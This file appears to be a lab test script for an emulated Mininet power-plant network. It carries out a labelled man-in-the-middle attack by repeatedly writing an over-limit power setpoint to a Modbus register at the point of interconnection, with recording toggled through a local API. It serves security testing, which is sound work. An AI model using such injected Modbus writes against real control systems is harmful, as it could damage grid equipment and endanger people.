'''
Man in the Middle attack to make POI power larger than allowed: 

    mininet> MITM python3 ./mininet_local/test_pmax_mitm.py

Example:

    mininet> MITM python3 ./mininet_local/test_pmax_mitm.py
    P_POI = 0.000

'''

import time
import requests
import json

url = "http://10.10.0.4:8200/setpoints"
headers = {"Content-Type": "application/json"}


from colinker.modbus.modbus_client import Modbus_client

response = requests.post(url, headers=headers, data=json.dumps({"record":True}))
time.sleep(1)

# POI python3 test_mininet_local.py
ip = "10.10.0.5"
port = 5002
mb = Modbus_client(ip,port=port)
mb.start()
reg_number = 370

for it in range(50):
    mb.write( 8000,reg_number, 'int32',format = 'CDAB')
    time.sleep(0.01)
value = mb.read(reg_number, 'int32',format = 'CDAB')

print(f'P_POI = {value/1e6:0.3f}')
mb.close()

time.sleep(10)
response = requests.post(url, headers=headers, data=json.dumps({"record":False}))
